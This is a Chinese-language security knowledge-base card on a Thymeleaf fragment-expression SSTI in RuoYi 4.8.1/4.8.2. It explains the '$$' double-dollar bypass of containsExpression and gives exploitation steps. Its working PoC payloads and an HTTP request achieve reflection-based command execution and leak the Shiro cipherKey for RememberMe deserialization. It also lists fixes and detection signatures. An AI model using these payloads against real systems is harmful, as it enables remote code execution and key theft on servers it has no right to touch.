---
id: web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti
title: RuoYi Thymeleaf 片段表达式 SSTI 与双美元绕过
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-fragment-ssti-double-dollar-bypass
aliases:
- RuoYi SSTI
- Thymeleaf 片段注入
- $$ 绕过 containsExpression
- CacheController fragment 注入
- RuoYi 4.8.1 SSTI
tags:
- ssti
- thymeleaf
- spel
- ruoyi
- spring
- bypass
- rce
- shiro
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: RuoYi 4.8.1、4.8.2 受影响；4.8.3 修复
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:36:00+08:00'
  notes: 已对照原文核对；入口代码/1242双写绕过/Thymeleaf字面量替换/ShiroKey 回显 PoC 与截图一致，affected_versions 与原文 4.8.1/4.8.2 受影响、4.8.3 修复一致；未本地复现
---

## 一句话结论

RuoYi 4.8.1/4.8.2 的 `CacheController` 把用户可控的 `fragment` 直接拼到 Thymeleaf 片段表达式 `prefix + "/cache::" + fragment` 后返回视图名；使用 `$${...}` 双写可以绕过 `SpringRequestUtils#containsExpression` 的单次扫描，使 Thymeleaf 将第二个 `${...}` 当作 SpEL 执行，从而直接命令执行或读取 Shiro `cipherKey` 完成反序列化 RCE。

## 原理

- 漏洞入口：
  ```java
  @PostMapping("/getNames")
  public String getCacheNames(String fragment, ModelMap mmap) {
      mmap.put("cacheNames", cacheService.getCacheNames());
      return prefix + "/cache::" + fragment;
  }
  ```
  `getKeys`、`getValue` 同样拼接 `fragment`。返回值被 Spring/Thymeleaf 解释为视图名 + 片段选择器 `template :: fragment`，`fragment` 中的表达式会被 Thymeleaf 解析。
- 表达式预处理与字面量替换：`__...__` 是 Thymeleaf 的预处理语法，先执行内部表达式再替换回原位置；`|...|` 是字面量替换，内部可嵌入 `${...}`。两者组合能让 payload 在片段选择器上下文中被求值。
- **双美元绕过**：`SpringRequestUtils#containsExpression` 线性扫描，遇到 `$ # @ ~ *` 置 `expInit=true`；下一字符若是 `{` 返回 true，否则若为非空白字符就把 `expInit` 重置为 false，**不会把当前字符重新当作新的表达式起始符**。因此 `$${...}` 中第一个 `$` 进入匹配态，第二个 `$` 被当作失败字符消费，随后的 `{` 不再被识别，函数返回 false，绕过检测。
- **Thymeleaf 侧的解析**：`ExpressionParsingUtil#performLiteralSubstitution` 中，单独的 `$` 只当普通字符，`${...}` 才是表达式。于是 `$${...}` 被解析成 `'$' + ${...}`，第二个表达式仍会执行。
- 另一个过滤器 `SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam` 会拦截 `new SomeClass` 与 `T(SomeClass)` 这类实例化/静态访问；但反射 API（`getClass().forName`、`getMethods()`、`getConstructor().newInstance()`、`invoke`）未被拦截，因此可继续构造反射链（见关联卡）。
- 执行上下文可访问 Spring Bean（如 `@securityManager`），因此可直接读取 Shiro 的 `rememberMeManager.cipherKey`，再用该密钥伪造 RememberMe 反序列化载荷。

## 触发条件

- RuoYi 4.8.1 或 4.8.2（4.8.3 修复）。
- 攻击者拥有 `monitor:cache:view` 权限（接口有 `@RequiresPermissions`），通常是后台低权限账号或通过其它方式获取的会话。
- 能向 `/monitor/cache/getNames`、`/getKeys`、`/getValue` 提交 `fragment` 参数，并携带有效 CSRF Token。
- Thymeleaf 片段表达式未禁用，且 SpEL 求值未使用受限上下文。

## 利用步骤

1. 登录 RuoYi 后台，获取 `JSESSIONID` 与 `X-CSRF-Token`。
2. 向 `/monitor/cache/getNames` 发送 `fragment` 参数，先验证表达式是否执行（如打印简单值）。
3. 使用 `$${...}` 形式绕过 `containsExpression`，在 `${...}` 中通过反射调用 `Runtime.exec` 执行命令；或用 `@securityManager.rememberMeManager.cipherKey` 读取 Shiro 密钥。
4. 若目标是读取 ShiroKey，拿到 Base64 密钥后按 Shiro RememberMe 反序列化链构造恶意 cookie，触发 RCE。
5. 若目标是直接命令执行，构造 `Runtime.getRuntime().exec(...)` 的反射调用；注意不同 JDK 的 `getMethods()` 返回顺序可能不同，需按方法签名选择正确的重载。
6. 若 `new`/`T()` 被拦截，改用反射链构造对象（见关联卡）。

## PoC

直接命令执行（URL 解码前）：

```text
fragment=__|$${#response.getWriter().print(''.getClass().forName('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null).getClass.getMethods.?[name=='exec'][1].invoke(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null),'open -a Calculator'))}|__
```

读取 Shiro `cipherKey`：

```text
fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__
```

HTTP 请求：

```http
POST /monitor/cache/getNames HTTP/1.1
Host: target
Cookie: JSESSIONID=<session>
X-CSRF-Token: <csrf>
Content-Type: application/x-www-form-urlencoded

fragment=__%7C%24%24%7B%23response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(%40securityManager.rememberMeManager.cipherKey))%7D%7C__
```

预期响应体返回 Base64 编码的 Shiro 密钥（示例形态 `gXIb0/Tj5QS+FDhNHUkjTg==`），随后可用于 RememberMe 反序列化。

## 变体与关联

- 变体：`$${}`、`##{}`、`@@{}` 等双写组合都可触发同样的“第二个起始符被消费”问题；也可用 `*` 等字符构造。
- 变体：`__...__` 预处理 + `|...|` 字面量替换可组合出更复杂的 payload；相同表达式第一次解析后会被 Thymeleaf 缓存，后续请求可能不再触发断点。
- 变体：读取 ShiroKey 后走 RememberMe 反序列化；或直接 `Runtime.exec`；或注入内存马（见关联卡）。
- 关联：[[web-java-expression-spel-restricted-reflection-memshell]] 讲 `T()`/`new` 被拦截时用反射链构造对象并注入内存马；本卡聚焦片段表达式入口与 `$$` 绕过。
- 关联：`web/java/framework/shiro` 下的 RememberMe 反序列化利用；本卡提供获取 `cipherKey` 的前置原语。

## 检测与防御

- 修复：升级到 RuoYi 4.8.3；不要仅依赖 `containsExpression` 的字符串扫描。
- 修复：不要把用户输入拼进视图名/片段表达式；`fragment` 使用固定枚举白名单（如 `cache`、`keys`、`value`），拒绝 `$`、`#`、`@`、`~`、`*`、`{`、`}` 等字符。
- 修复：`containsExpression` 在 `expInit=true` 且当前字符不是 `{`/空白时，应重新判断当前字符本身是否可作为新的起始符，而不是直接丢弃。
- 修复：SpEL 求值使用 `SimpleEvaluationContext` 或受限 `EvaluationContext`，禁用类型访问、Bean 引用、方法调用与反射；Thymeleaf 关闭不必要的表达式功能。
- 加固：后台账号最小权限，`monitor:cache:view` 不应授予非必要人员；管理端限制来源 IP 与强认证。
- 检测：请求 `fragment` 中出现 `$${`、`##{`、`@@{`、`__|`、`|__`、`getClass().forName`、`getMethods.?[name==`、`Runtime`、`ProcessBuilder`、`securityManager` 等特征。
- 检测：Thymeleaf 模板处理异常堆栈中出现 `ExpressionParsingUtil`/`SpelExpression` 且请求体含表达式；响应体异常返回 Base64 密钥或不完整 HTML。
